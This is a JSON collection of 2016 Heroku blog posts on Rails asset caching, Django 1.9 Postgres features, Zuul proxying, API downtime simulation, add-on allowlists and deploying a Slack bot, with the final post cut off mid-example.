{"website": "Heroku", "title": "Building a P2P Marketplace on Heroku: An Interview with Vitali Margolin", "author": ["Matthew Creager"], "link": "https://blog.heroku.com/building-roomer-travel-p2p-marketplace", "abstract": "Building a P2P Marketplace on Heroku: An Interview with Vitali Margolin Posted by Matthew Creager February 16, 2016 Listen to this article Based in Tel Aviv, Israel, Vitali Margolin is the Head of R&D for Roomer. Vitali leads a team of seven developers who built and operate the travel marketplace www.roomertravel.com and the travel protection service www.life-happens.com , both running on Heroku. What are you running on Heroku? The four big projects are: the Roomer website, our administration app, our partner network and B2B website, and the Roomer API. The Roomer API is our highest load app. It can get up to 10k requests per minute from partner integrations such as Kayak. We have a few more technical products, including an app that does text recognition and automatically decodes confirmation emails, as well as a smart pricing system and a search algorithm. About 90% of everything runs on Heroku. We have ten “pipelines” which represent ten projects. In every pipeline we have staging, production, and a few sandboxes, so I’m guessing we have about 50 apps total on Heroku. Tell us about your stack Roomer is basically all Ruby on Rails. We have some models built in C++, which are integrated inside Ruby, and which we compile automatically when they get pushed to production. On the front end we use a bit of CoffeeScript, and the Backbone.js framework. We use SCSS for our CSS rendering. Our database is MySQL stored directly on Amazon. We use Amazon Redshift for our data warehouse because we process a lot of data, especially from our API. After we reached something like 10 billion rows in MySQL, we got to the point that it just couldn’t handle the speed we wanted, so we moved to Redshift. We use Amazon SQS for queuing services. We use a lot of Heroku add-ons, including Memcached Cloud and Redis Cloud for caching, New Relic APM for performance monitoring, Logentries for all our logs, Librato for real-time monitoring, and also Gemfury . How does your team ship new features? We take a continuous integration and continuous deployment approach using Heroku’s GitHub integration and CircleCI’s GitHub integration. We follow the GitHub approach of two branches – the master and the branch you’re working on. So every developer can push to master and push to production, and whenever you actually merge something it will go into CircleCI, run the tests, and automatically deploy. Everyone is notified and the developer updates what he output to production. So we upload between zero and twelve versions every day—but not before weekends! You mentioned Pipelines earlier, how does that fit into your CD workflow? We’ve tried your Heroku Pipelines system and we like it because it’s so comfortable. Every developer doesn’t have to have his own environment. Review Apps let us spin up an environment for every branch automatically whenever a developer does a pull request. When the developer finishes, he can merge it and QA can promote it to their environment. QA can then check it and promote it to production. It lets us bypass the “who’s using staging #3?” type of conversation during the work day. It takes time to create more environments, and Pipelines just gives you that automatically. Have you experimented with microservices? We’re currently migrating some of our logic to microservices using SQS.  Although a true microservice is two different projects talking through a queue or the network, we do have specific gems for different models. They may be hard coded on Heroku, but they’re in a separate gem, so it’s pretty modular. Another example is our hotel-matching algorithm. We built this to resolve any discrepancies, such as in hotel name or street name spellings, street vs. avenue, geographic locations, etc. It can check all the variations and pinpoint the correct hotel. This is done as a microservice, which is basically a separate app talking through SQS. We’re also migrating our booking engine to a different microservice. How do you find out about new Heroku features? I go to Heroku Labs once in awhile to check on new features. I also get Ruby Weekly and Heroku newsletters. We are very early adopters in our soul, so we usually check out the new stuff as soon as it’s available. -- Founded in 2011, Roomer Travel connects travelers who are stuck with a nonrefundable hotel room with those looking for last minute, discounted accommodation. Read our Roomer Travel Customer Story to learn more about Roomer’s business. Travel & Transportation Israel Size: small E-Commerce ruby redis Startup", "date": "2016-02-16,"},
{"website": "Heroku", "title": "Speeding up Sprockets", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/speeding-up-sprockets", "abstract": "Speeding up Sprockets Posted by Richard Schneeman February 21, 2016 Listen to this article The asset pipeline is the slowest part of deploying a Rails app. How slow? On average, it's over 20x slower than installing dependencies via $ bundle install . Why so slow? In this article, we're going to take a look at some of the reasons the asset pipeline is slow and how we were able to get a 12x performance improvement on some apps with Sprockets version 3.3+ . The Rails asset pipeline uses the sprockets library to take your raw assets such as javascript or Sass files and pre-build minified, compressed assets that are ready to be served by a production web service. The process is inherently slow. For example, compiling Sass file to CSS requires reading the file in, which involves expensive hard disk reads. Then sprockets processes it, generating a unique \"fingerprint\" (or digest) for the file before it compresses the file by removing whitespace, or in the case of javascript, running a minifier. All of which is fairly CPU-intensive. Assets can import other assets, so to compile one asset, for example, an app/assets/javascripts/application.js multiple files may have to be read and stored in memory. In short, sprockets consumes all three of your most valuable resources: memory, disk IO, and CPU. Since asset compilation is expensive, the best way to get faster is not to compile. Or at least, not to compile the same assets twice. To do this effectively, we have to store metadata that sprockets needs to build an asset so we can determine which assets have changed and need to be re-compiled. Sprockets provides a cache system on disk at tmp/cache/assets . If the path and mtime haven't changed for an asset then we can load the entire asset from disk. To accomplish this task, sprockets uses the cache to store a compiled file's digest. This code looks something like: # https://github.com/rails/sprockets/blob/543a5a27190c26de8f3a1b03e18aed8da0367c63/lib/sprockets/base.rb#L46-L57\n\ndef file_digest(path)\n  if stat = File.stat(path)\n    cache.fetch(\"file_digest:#{path}:#{stat.mtime.to_i}\") do\n      Digest::SHA256.file(path.to_s).digest\n    end\n  end\nend Now that we have a file's digest, we can use this information to load the asset. Can you spot the problem with the code above? If you can't, I don't blame you—the variables are misleading. path should have been renamed absolute_path as that's what's passed into this method. So if you precompile your project from different directories, you'll end up with different cache keys. Depending on the root directory where it was compiled, the same file could generate a cache key of: \"file_digest:/Users/schneems/my_project/app/assets/javascripts/application.js:123456\" or: \"file_digest:/+Other/path/+my_project/app/assets/javascripts/application.js:123456\" . There are quite a few Ruby systems deployed using Capistrano, where it's common to upload different versions to new directories and setup symlinks so that if you need to rollback a bad deploy you only have to update symlinks. When you try to re-use a cache directory using this deploy strategy, the cache keys end up being different every time. So even when you don't need to re-compile your assets, sprockets will go through the whole process only stopping at the very last step when it sees the file already exists: # https://github.com/rails/sprockets/blob/543a5a27190c26de8f3a1b03e18aed8da0367c63/lib/sprockets/manifest.rb#L182-L187\n\nif File.exist?(target)\n  logger.debug \"Skipping #{target}, already exists\"\nelse\n  logger.info \"Writing #{target}\"\n  asset.write_to target\nend Sprockets 3.x+ is not using anything in the cache, and as has been reported in issue #59 , unless you're in debug mode, you wouldn't know there's a problem, because nothing is logged to standard out. It turns out it's not just an issue for people deploying via Capistrano. Every time you run a $ git push heroku master your build happens on a different temp path that is passed into the buildpack. So even though Heroku stores the cache between deploys, the keys aren't reused. The (almost) fix The first fix was very straightforward. A new helper class called UnloadedAsset takes care of generating cache keys and converting absolute paths to relative ones: UnloadedAsset.new(path, self).file_digest_key(stat.mtime.to_i) In our previous example we would get a cache key of \"file_digest:/app/assets/javascripts/application.js:123456\" regardless of which directory you're in. So we're done, right? As it turns out, cache keys were only part of the problem. To understand why we must look at how sprockets is using our 'file_digest_key'. Pulling an asset from cache Having an asset's digest isn't enough. We need to make sure none of its dependencies have changed. For example, to use the jQuery library inside another javascript file, we'd use the //= require directive like: //= require jquery\n//= require ./foo.js\n\nvar magicNumber = 42; If either jquery or foo.js change, then we must recompute our asset. This is a somewhat trivial example, but each required asset could require another asset. So if we wanted to find all dependencies, we would have to read our primary asset into memory to see what files it's requiring and then read in all of those other files; exactly what we're trying to avoid. So sprockets stores dependency information in the cache. Using this cache key: \"asset-uri-cache-dependencies:#{compressed_path}:#{ @env.file_digest(filename) }\" Sprockets will return a set of \"dependencies.\" #<Set: {\"file-digest///Users/schneems/ruby/2.2.3/gems/jquery-rails-4.0.4\", \"file-digest///Users/schneems/app/assets/javascripts/foo.js\"}> To see if either of these has changed, Sprockets will pull their digests from the cache like we did with our first application.js asset. These are used to \"resolve\" an asset. If the resolved assets (and their dependencies) have been previously loaded and stored in the cache, then we can pull our asset from cache: # https://github.com/rails/sprockets/blob/9ca80fe00971d45ccfacb6414c73d5ffad96275f/lib/sprockets/loader.rb#L55-L58\n\ndigest = DigestUtils.digest(resolve_dependencies(paths))\nif uri_from_cache = cache.get(unloaded.digest_key(digest), true)\n  asset_from_cache(UnloadedAsset.new(uri_from_cache, self).asset_key)\nend But now, our dependencies contain the full path. To fix this, we have to \"compress\" any absolute paths, so that if they're relative to the root of our project we only store a relative path. Of course, it's never that simple. Absolute paths everywhere In the last section I mentioned that we would get a file digest by resolving an asset from `\"file-digest///Users/schneems/app/assets/javascripts/foo.js\". That turns out to be a pretty involved process. It involves a bunch of other data from the cache, which as you guessed, can have absolute file paths. The short list includes: Asset filenames, asset URIs, load paths, and included paths, all of which we handled in Pull Request #101 . But wait, we're not finished, the list goes on: Stubbed paths, link paths, required paths (not the same as dependencies), and sass dependencies, all of which we handled in Pull Request #109 , phew. The final solution? A pattern of \"compressing\" URIs and absolute paths, before they were added to the cache and \"expanding\" them to full paths as they're taken out. URITar was introduced to handle this compression/expansion logic. All of this is available in Sprockets version 3.3+ . Portability for all When tested with an example app, we saw virtually no change to the initial compile time (around 38 seconds). The second compile? 3 seconds. Roughly a 1,200% speed increase when using compiled assets and deploying using Capistrano or Heroku. Not bad. Parts of the URITar class were not written with multiple filesystems in mind, notably Windows, which was fixed in Pull Request #125 and released in version 3.3.4. If you're going to write code that touches the filesystems of different operating systems, remember to use a portable interface. Into the future Sprockets was originally authored by one prolific programmer, Josh Peek . He's since stepped away from the project and has given maintainership to the Rails core team. Sprockets 4 is being worked on with support for source maps. If you're running a version of Sprockets 2.x you should try to upgrade to Sprockets 3.5+, as Sprockets 3 is intended to be an upgrade path to Sprockets 4. For help upgrading see the upgrade docs in the 3.x branch . Sprockets version 3.0 beta was released in September 2014; it took nearly a year for a bug report to come in alerting maintainers to the problem. In addition to upgrading Sprockets, I invite you to open up issues at rails/sprockets and let us know about bugs in the latest released version of Sprockets. Without bug reports and example apps to reproduce problems, we can't make the library better. This performance patch was much more involved than I could have imagined when I got started, but I'm very pleased with the results. I'm excited to see how this affects overall performance numbers at Heroku—hopefully you'll be able to see some pretty good speed increases. Thanks for reading, now go and upgrade your sprockets. Schneems writes code for Heroku and likes working on open source performance patches. You can find him on his personal site . rails performance", "date": "2016-02-21,"},
{"website": "Heroku", "title": "Introducing Add-on Controls: Standardize Add-ons for Your Team", "author": ["Nahid Samsami"], "link": "https://blog.heroku.com/addon-controls", "abstract": "Introducing Add-on Controls: Standardize Add-ons for Your Team Posted by Nahid Samsami February 25, 2016 Listen to this article Today we are introducing Add-on Controls for Heroku Enterprise customers. This new feature enables team leads to allowlist specific add-ons for approved use within their organization, choosing from our marketplace of over 150 add-on services. The ability to standardize the add-on technologies being used across all the apps and developers in their organization is something many customers have asked for, especially those with fast-growing teams. Standardizing Add-ons Using the Allowlist To get started with Add-on Controls, the first step is for the team lead, or anyone who has admin permissions, to build the Add-ons Allowlist. There is a new section on the organization’s settings page, where this allowlist can be created and then the Add-on Controls can be enabled. Don’t worry; enabling the allowlist does not break any existing add-ons, but simply prevents add-ons that are not on the allowlist from being installed going forward. Managing Allowlist Exceptions In the Add-on Controls section, you’ll be able to see the add-ons that are currently in use in your organization’s apps, but have not yet been allowlisted (labeled “Allowlist Exceptions.”) For each item in the list, you can click on the detail view to see which apps have installed the add-on and how long it has been in use. Navigating Heroku Elements with Add-ons Allowlisting Once the feature is enabled, it is easy for team members to view and install the add-ons that are allowlisted for their organization. On the Elements page , the new \"Filter by Organization\" dropdown lets you see what is available by selecting your organization. This view will be especially helpful when onboarding new developers to the team, as it provides a quick way for them to see which technologies are approved for use in your organization and to hit the ground running. In addition, the Add-ons Allowlist can be kept dynamically up to date as new add-ons become available and are chosen, eliminating the need for email or wiki page updates. Team leads might choose to provide an approved vendor for each category of functionality (logging, messaging, caching and so on), narrowing down the many choices currently available in each category. Add-on Installation Restrictions Add-ons which are not allowlisted for use are marked as restricted and cannot be installed.  Note that add-ons will still be installable to personal apps that a team member owns that are not part of the organization. Learn more about Add-on Controls You can learn more about Add-on Controls in the Dev Center . As always, we welcome any feedback you have on this new feature. Please reach out to us at addons-feedback@heroku.com or contact us via through support.", "date": "2016-02-25,"},
{"website": "Heroku", "title": "Django 1.9's Improvements for Postgres", "author": ["Kenneth Reitz"], "link": "https://blog.heroku.com/django_1_9_s_improvements_for_postgres", "abstract": "Django 1.9's Improvements for Postgres Posted by Kenneth Reitz February 24, 2016 Listen to this article A big update to the beloved Python web framework known as Django was released recently: Django 1.9 . This release contains a long list of improvements for everything from the graphical styling of the admin to the ability to run your test suite in parallel. Our favorite improvements to the framework were, of course, all about our favorite database: Postgres. Here are some of the highlights from the official release notes (highly recommended reading). Renamed PostgreSQL Back-end Django's fantastic built-in Postgres database back-end received a nice name change. Previously known as django.db.backends.postgresql_psycopg2 , the back-end will now be officially available as the much easier to remember django.db.backends.postgresql . There is now no question that psycopg2 is the database driver to use when interacting with Postgres from Python. However, the old name will continue to work, for backwards compatibility. JSONField The release of Django 1.8 brought us built-in support for Postgres' useful HSTORE data type, via HStoreField , but the release of Django 1.9 has us even more excited. Django now ships with full support for Postgres' indexable JSONB datatype, as JSONField . Here's an example of what JSONField allows us to easily do within Django models: Profile.objects.create(\n    name='Arthur Dent',\n    info={\n         'residences': [\n             {'name': 'Earth', 'type': 'planet', 'status': 'destroyed'},\n             {'name': 'Heart of Gold', 'type': 'ship'}\n         ]\n    }\n) Before, without JSONField , this simple metadata would require a dedicated residences table, with a status column that would rarely be utilized. With JSONB , you have total flexibility of the shape of your data, without over-burdening your database schema. You can query the data, which can be fully indexed by Postgres, just as easily: >>> Profile.objects.filter(info__residences__contains={'name': 'Earth'})\n[<Profile: Arthur Dent>] JSONB is available on Postgres versions 9.4 and above, on all Heroku Postgres plans. Database Transaction Commit Hooks Django's database innards have a new hook available for executing a callable after a database transaction has been committed successfully: on_commit() . The code originates from the django-transaction-hooks project, which has been fully integrated into Django proper. Here's an example of using on_commit() with WebHooks: from datetime import datetime\n\nimport requests\nfrom django.db import connection\n\ndef alert_webservice():\n    \"\"\"Alerts webservice of database transaction events.\"\"\"\n\n    # Prepare WebHook payload.\n    time = datetime.utcnow().isoformat()\n    data = {'event': {'type': 'transaction', 'time': time}}\n\n    # Sent the payload to the webservice.\n    r = requests.post('https://httpbin.org/post', data=data)\n       \n    # Ensure that request was successful.\n    assert r.ok\n       \n# Register alert_webservice transaction hook.\nconnection.on_commit(alert_webservice) Deploy Django 1.9 on Heroku Today As always, Django 1.9 is fully supported by Heroku Python. Click the deploy button below to instantly deploy a free instance of a Django 1.9 application to your Heroku account, ready for hacking. django postgres python jsonb hstore", "date": "2016-02-24,"},
{"website": "Heroku", "title": "Simulate Third-Party Downtime", "author": ["Damien Mathieu"], "link": "https://blog.heroku.com/simulate-downtime", "abstract": "Simulate Third-Party Downtime Posted by Damien Mathieu February 29, 2016 Listen to this article I spend most of my time at Heroku working on our support tools and services; help.heroku.com is one such example. Heroku's help application depends on the Platform API to, amongst other things, authenticate users, authorize or deny access, and fetch user data. So, what happens to tools and services like help.heroku.com during a platform incident? They must remain available to both agents and customers—regardless of the status of the Platform API. There is simply no substitute for communication during an outage. To ensure this is the case, we use api-maintenance-sim , an app we recently open-sourced, to regularly simulate Platform API incidents. Simulating downtime During a Platform API incident, the API is disabled. All requests receive a 503 (service unavailable) HTTP response. This is a simple behaviour that we can imitate on demand with api-maintenance-sim . At its core, api-maintainenance-sim responds to every request with a 503 HTTP status as shown below. run lambda { |env|\n  [\n    503,\n    {\"Content-Type\"=>\"application/json\"},\n    StringIO.new(%q|{ \"id\": \"maintenance\", \"message\": \"Heroku API is temporarily unavailable.\\nFor more information, visit: https://status.heroku.com\" }|)\n  ]\n} Once deployed, we begin the simulation by directing the app we're testing to use a custom hostname, rather than the default api.heroku.com. Here's an example using the platform-api gem. PlatformAPI.connect_oauth(current_user.oauth_token, url: ENV['PLATFORM_API_URL']) If PLATFORM_API_URL is not configured, it will default to nil, which the gem will replace with the production URI. If it's defined, however, you will be using the hostname of your choice. You can now use config vars to start the simulation. $ heroku config:set PLATFORM_API_URL=https://my-simulation-app.herokuapp.com Conclusion It's not a matter of if an incident will occur; it's a matter of when . Running regular simulations is an easy way to improve your applications stability, or at the very least, to understand what failure will mean for your application or service. api uptime", "date": "2016-02-29,"},
{"website": "Heroku", "title": "Migrating from the Mandrill Add-on", "author": ["Peter Cho"], "link": "https://blog.heroku.com/migrating_from_the_mandrill_add_on", "abstract": "Migrating from the Mandrill Add-on Posted by Peter Cho March 01, 2016 Listen to this article Last week MailChimp announced that they are shutting down the Mandrill Heroku Add-on,  giving users until April 27th to migrate to another solution. Many of our customers have sought guidance on how and where to migrate, so we have asked our email providers to create guides for migrating from the Mandrill add-on to their respective services. Mailgun : Migrating from the Heroku Mandrill Add-on to the Mailgun Add-on Postmark : Migrating your Mandrill Heroku Add-on to Postmark SendGrid : Replacing the Mandrill Heroku Add-on with the SendGrid Add-on SparkPost : Migrating from Mandrill to SparkPost on Heroku", "date": "2016-03-01,"},
{"website": "Heroku", "title": "Using Netflix Zuul to Proxy your Microservices", "author": ["Joe Kutner"], "link": "https://blog.heroku.com/using_netflix_zuul_to_proxy_your_microservices", "abstract": "Using Netflix Zuul to Proxy your Microservices Posted by Joe Kutner March 02, 2016 Listen to this article A common challenge when building microservices is providing a unified interface to the consumers of your system. The fact that your services are split into small composable apps shouldn’t be visible to users or result in substantial development effort. To solve this problem, Netflix (a major adopter of microservices) created and open-sourced its Zuul proxy server . Zuul is an edge service that proxies requests to multiple backing services. It provides a unified “front door” to your system, which allows a browser, mobile app, or other user interface to consume services from multiple hosts without managing cross-origin resource sharing (CORS) and authentication for each one. You can integrate Zuul with other Netflix projects like Hystrix for fault tolerance and Eureka for service discovery, or use it to manage routing rules, filters, and load balancing across your system. Thanks to Netflix and the Spring Cloud project , you can deploy a Zuul server on Heroku in just a few minutes. This service requires very little code, and can be used with microservices written in any language--not just Java. Create the Zuul Server To begin, deploy the Heroku Zuul server demo project by clicking this button: When the deployment is complete, click the “View” link at the bottom of the page. When the app opens, it will display links to the services that Zuul exposes. Click a few to give them a try. It will appear to you that the services are running in the app you just deployed but you are actually viewing services from another application ( httpbin.org ), which are proxied through the Zuul server. The demo uses the following configuration located in the src/main/resources/application.yml file of the demo project: zuul:\n  routes:\n    get:\n      path: /get/**\n      url: http://httpbin.org/get\n    links:\n      path: /links/**\n      url: http://httpbin.org/links\n    images:\n      path: /image/**\n      url: http://httpbin.org/image The configuration contains three named routes. Each route has a path , which defines the URL mapping in the Zuul server, and a url , which defines the URL of the remote service to proxy. There is also an entry that disables Eureka service discovery, but that has been omitted here. This is the simplest and easiest way to configure the proxy, but it’s also very static and can’t adjust to changes or failures in your system. Zuul has the ability to load-balance its services and failover to an alternative service if the primary host goes down. Adding load balancing and failover The Zuul server you deployed comes pre-packaged with Ribbon, a client-side load-balancer, and Hystrix, a fault tolerance library. Both projects are part of the Netflix OSS suite, which means they integrate seamlessly with Zuul. All you need to do is enable them. First, make sure you have the Heroku toolbelt installed. Then clone the app you deployed earlier by running this command (but replace “<app-name>” with the name of your Heroku app): $ heroku git:clone <app-name>\n$ cd <app-name> Open the src/main/resources/application.yml and replace the zuul configuration with this code: zuul:\n  routes:\n    httpbin:\n      path: /**\n      serviceId: httpbin\n\nhttpbin:\n  ribbon:\n    listOfServers: httpbin.org,eu.httpbin.org\n\nribbon:\n  eureka:\n    enabled: false This configuration tells Zuul to forward all requests to the httpbin service, which is defined after the zuul entry. The httpbin entry defines the available servers: httpbin.org and its European counterpart, eu.httpbin.org. If the first host goes down, the proxy will failover to the second host. It also disables Eureka discovery for Ribbon because you don’t have a Eureka server.... yet. Now you can run the Zuul server locally. Build the project by running this command: $ ./mvnw clean package Then launch the server locally by executing this command: $ heroku local web After a few moments, the embedded Tomcat server will be ready to handle requests. Open a browser to http://localhost:5000 and you’ll see the complete httpbin.org site. Manually configuring Ribbon to load balance your services is a great feature, but it’s just the beginning of what the Spring Cloud suite can do. If Zuul is connected to a Eureka server, it can automatically add fault tolerance and client-side load balancing to the services it proxies. Connecting to Eureka Eureka, another Netflix OSS project, is a service registry. It's like a phone book for your microservices. Each microservice registers itself with Eureka, and then consumers of that service know how to find it. This is similar in spirit to a DNS service but with additional features such as host-side load-balancing and region-isolation. Eureka also keeps track of health, availability and other metadata about the service, which makes it an ideal component to integrate with your Zuul proxy. For this example, you’ll need to deploy both a Eureka server and a Eureka client service by following our blog post on Managing your Microservices on Heroku with Netflix's Eureka . Once you have both components deployed, you can connect them to Zuul, which can discover the Eureka client service from the Eureka server and proxy requests to it. From your local Zuul repository, open the src/main/resources/application.yml again, and replace its contents with this code: zuul:\n  routes:\n    my-service:\n      path: /my-service/**\n      serviceId: my-service\n\neureka:\n  client:\n    serviceUrl:\n      defaultZone: ${EUREKA_URL:http://user:password@localhost:5000}/eureka/ The configuration defines a single service route, my-service , which uses a serviceId with the same name. But unlike the Ribbon configuration, you have not defined the my-service details in this file. Instead, Zuul will retrieve them from the Eureka server, which is configured under the eureka entry. It defines the Eureka server’s location at $EUREKA_URL and falls back to a localhost address if it’s not set. Now set the $EUREKA_URL on your Heroku app using the URL and credentials of the Eureka server you deployed earlier by running a command like this: $ heroku config:set EUREKA_URL=”http://user:<password>@<your-eureka-app>.herokuapp.com” Commit your changes, and redeploy the Zuul server by running these commands: $ git add src/main/resources/application.yml\n$ git commit -m “eureka”\n$ git push heroku master Finally, open your Eureka client service through the Zuul proxy by running this command: $ heroku open my-service From now on, Zuul can proxy each service you registry with the Eureka server simply by adding to your application.yml . It will wrap the requests in Hystrix commands, to ensure failover, and load-balance with Ribbon. It can also handle many other features such as filters, file uploads, request headers and more. Further Reading For more information about Zuul, Ribbon and Hysterix, please see the following documentation from Netflix OSS: Zuul Ribbon Hysterix For more information on Spring and its Netflix integration, please see the Spring Cloud documentation . To learn more about deploying Spring Boot applications on Heroku, see this article on Dev Center , or visit Java on Heroku in Dev Center .", "date": "2016-03-02,"},
{"website": "Heroku", "title": "How to Deploy Your Slack Bots to Heroku", "author": ["Matthew Creager"], "link": "https://blog.heroku.com/how-to-deploy-your-slack-bots-to-heroku", "abstract": "How to Deploy Your Slack Bots to Heroku Posted by Matthew Creager March 08, 2016 Listen to this article Whether they're publishing notifications, responding to /slash commands or carrying a conversation, bots have become an integral part of the way we work with Slack.  A bot can do any number of things for your team as part of your day-to-day work, you're only limited by your imagination. For some first-hand experience, check out the Heroku Button Gallery , where users have created all types of bots: from fun bots like poker and Jeopardy! , to more practical ones like a bot that tracks the satisfaction of your team members or one that reminds your team to review existing pull requests . That said, the real power and fun of Slack bots comes once you know how to build your own.  In this post, we'll show you how to create and deploy a Slack bot that will respond to /slash commands in order to show the top trending repos in GitHub.  While a Slack bot can be built in practically any language, today we're going to build ours with Node, and not just because I 💖 Node. Anything beyond a simple notification bot depends on Slack's WebSocket-based RTM (Real Time Messaging) API , and WebSockets and Node go together like 🍔🍟. We've got a lot of ground to cover, here's an outline of the journey we're about to take: Getting Started Publishing Notifications to Slack Receiving and Responding to /slash Commands Connecting a Bot to the Slack RTM API Share Your Bot with the Heroku Button Epilogue Getting Started Let me introduce you to 🌟 Starbot , the example we'll be working with today.  It's soon-to-be the easiest way to stay apprised of hip repos on GitHub, from the comfort of your favorite Slack channel. Before you begin Here's what you'll need: A (free or better) Heroku account The Heroku Toolbelt A Slack team to abuse Node (5.7.* preferably) The burning desire to scream IT'S ALIVE . This guide bounces between Slack, Heroku and your local development machine — so I've prefixed the sub-titles with the applicable logo where appropriate. Create a custom Slack integration We're going to make a custom integration bot designed explicitly for your team. As a bonus, I'll show you how to easily distribute your bot using the Heroku Button, so that you can share your creation with everyone – even grandma. (Note that if you are building a serious bot, you will ultimately want to run it on Hobby rather than Free dynos to avoid any issues with dyno sleeping and idling.  But Free dynos are great for building and testing.) First, visit slack.com/apps/build and select \"Make a Custom Integration\" as seen below. Run Starbot locally Starbot is essentially a bare-bones Express app, you can find detailed instructions on running it locally in the projects README.md . Clone the project $ git clone https://github.com/mattcreager/starbot.git\n$ cd starbot Install dependencies $ npm install Copy .env-example to .env $ cp .env-example .env Start Starbot $ npm start\n\n🚀 Starbot LIVES on PORT 3000 🚀 That's it! Visit localhost:3000 and make sure Starbot is running. Deploy Starbot to Heroku We could push our code to Heroku without ever visiting the command line, but what fun  would that be? Create a Heroku app, with the Heroku Toolbelt $ heroku create {optional-app-name}\n\nCreating app... done, stack is cedar-14\nhttps://starbot-staging.herokuapp.com/ Push our code $ git push heroku master\n\nCounting objects: 15, done.\nDelta compression using up to 8 threads.\nCompressing objects: 100% (14/14), done.\nWriting objects: 100% (15/15), 5.72 KiB | 0 bytes/s, done.\nTotal 15 (delta 0), reused 0 (delta 0)\nremote: Compressing source files... done.\nremote: Building source:\nremote:\nremote: -----> Node.js app detected\n...\nremote:        https://starbot-staging.herokuapp.com/ deployed to Heroku\nremote:\nremote: Verifying deploy.... done.\nTo https://git.heroku.com/starbot-staging.git\n * [new branch]      master -> master Did we just deploy this application in two commands? Yes, yes we did! Heroku installed the dependencies in Starbot's package.json file automatically, and gave us a URL so that we can visit our newly deployed app. Open the app in a browser $ heroku open Now Starbot is running on Heroku, but it doesn't know anything about Slack, and Slack doesn't know anything about it. I expect they'll soon be fast friends, so let's make introductions. Publish Notifications to Slack While publishing notifications to Slack is the simplest of custom integrations, it's still pretty darn cool, especially with a sprinkling of Heroku Add-ons . Let's show Starbot how to find trending GitHub projects and publish them to a Slack channel every morning. In this case, Starbot is using the BotKit framework from the folks at Howdy.ai . Set up an \"Incoming WebHook\" on Slack Slack will provide us with the API endpoint, or webhook; later, we'll POST data to this endpoint. Select \"Incoming WebHooks\" and choose a channel. Again, the above selection can be found at {your-team}.slack.com/apps/build/custom-intergration Now you're the proud new owner of a Slack \"Incoming WebHook\"! The configuration page includes a lot of great information about formatting and delivering messages to your new webhook, but what we need first is the \"Webhook URL\". It should look something like this: https://hooks.slack.com/services/T0..LN/B0..VV1/br..dd Found it? 👏 Now let's move right along. Publish a Notification to Slack from Heroku Now that we've deployed our Starbot to Heroku and added an incoming webhook on Slack, it's time to connect the dots. First, remember the webhook URL I had you save? Let's put it to work by setting a WEBHOOK_URL config  var . This makes the value available to Starbot. $ heroku config:set WEBHOOK_URL=https://hooks.slack.com/services/T0..LN/B0..VV1/br..dd\n\n  Setting config vars and restarting starbot-staging... done\n  WEBHOOK_URL: https://hooks.slack.com/services/T0..LN/B0..VV1/br..dd Heroku Add-ons allow us to quickly extend the functionality of our application, in this case, we're going to use the Scheduler add-on to deliver trending GitHub repos to Slack daily. We can provision the add-on from the dashboard, or from the CLI with the Heroku Toolbelt. $ heroku addons:create scheduler\n\n  Creating scheduler-transparent-24143... done, (free)\n  Adding scheduler-transparent-24143 to starbot-staging... done\n\n$ heroku addons:open scheduler Then add a scheduled task, and configure it to run daily. Our new scheduled task will create a one-off dyno and execute npm run notify , which is defined in this bit of our package.json . {\n  \"name\": \"starbot\",\n  ...\n  \"scripts\": {\n    \"start\": \"node ./src\",\n    \"notify\": \"node ./src/tasks/notify\",\n    \"test\": \"standard\"\n  },\n  ...\n  \"engines\": {\n    \"node\": \"5.7.1\"\n  }\n} We could wait patiently for the task we scheduled to fire—or we could just run our own one-off dyno, and trigger the notification ourselves. Immediate gratification, FTW. $ heroku run \"npm run notify\" Let the notifications commence. Receive and Respond to /slash Commands Slash commands are a personal favorite—enabling you to listen for a custom command,   across channels, and triggering a POST or GET request to a configurable endpoint. In this case, that endpoint will be the Starbot application we deployed earlier, and responding to /slash commands will let our bot do a lot more than post once a day! Creating a /starbot slash command Return to the \"Build a Custom Integration\" page and select \"Slash Commands\". Next, pick a name, it must begin with / . Now that we've created the command, we need to configure it. Starbot is expecting a POST request to arrive at /commands/starbot . Slack has also provided us with a token specific to this command, something like: JzRR6hEuh3f749iXY3qEpVgN . We're going to use this to verify the payload Starbot receives is coming from Slack. It wouldn't hurt to choose an appropriate name, icon, descriptive label and some autocomplete text—you could make something up, or use the suggestions provided in Starbot's readme . Configuring the /starbot command on Heroku We've already deployed Starbot to Heroku, so it's waiting patiently for POST requests from Slack, but at the moment Slack's requests are going to receive a 402 (Unauthorized) response. To fix that, we'll need to authenticate the bot with Slack, which is easy. We'll just use the Heroku Toolbelt to set a STARBOT_COMMAND_TOKEN config  var . $ heroku config:set STARBOT_COMMAND_TOKEN=JzRR6hEuh3f749iXY3qEpVgN\n\n  Setting config vars and restarting starbot-staging... done\n  STARBOT_COMMAND_TOKEN: JzRR6hEuh3f749iXY3qEpVgN Your slash is my command Connecting a Bot to the Slack RTM API And finally the star of the show, a developer's best friend, the real-time bot. Fortunately, no matter how tricky your bot is to build, configuring and deploying it to Heroku is simple. Connecting a bot to the Slack RTM API Ok, one last trip to the \"Build a Custom Integration\" page and this time we're going to select \"Bots\". We get to give our bot a name! And again, we're presented with the opportunity to customize the bot we've just created by giving it a name, description, icon, etc. You'll notice that the bot isn't currently following any channels. Bots are like vampires: they must be invited to a channel before they can follow it (any takers for BuffyBot?). Take note of the API token, which is going to look like this: xoxb-253973540645-lAJG4hL34343f3pk52BE6JO . Without it, we won't be able to authenticate. Configuring the bot on Heroku The Starbot bot won't attempt to connect to Slack's RTM API without a token, so once more, let's use the Heroku Toolbelt to set a SLACK_TOKEN config var. $ heroku config:set SLACK_TOKEN=xoxb-253973540645-lAJG4hL34343f3pk52BE6JO\n\n  Setting config vars and restarting starbot-staging... done\n  SLACK_TOKEN: xoxb-253973540645-lAJG4hL34343f3pk52BE6JO That's it! Head over to your Slack channel and use the /invite command to invite our @starbot bot to the channel. Then say hello to him, or her! It's alive, it's alive, it's ALIVE! Share Your Bot with the Heroku Button The Slack Button makes it easy for other Slack users to add your bot to their team, but the Heroku Button makes it just as easy for other developers to deploy and manage your bot themselves. Adding a button to your bot is as simple as creating an app.json file, and adding the button to our GitHub readme. Creating an app.json The app.json file is a manifest format for describing web apps. Here's the interesting bits from Starbot's app.json : {\n  \"name\": \"🌟 Starbot\",\n  \"description\": \"tarbot is GitHub's trending open-source page, reincarnated as a Slack bot\",\n  \"repository\": \"https://github.com/mattcreager/starbot\",\n  \"env\": {\n    \"STARBOT_COMMAND_TOKEN\": {\n      \"description\": \"Slash command token, for the starbot command endpoint\",\n      \"required\": true\n    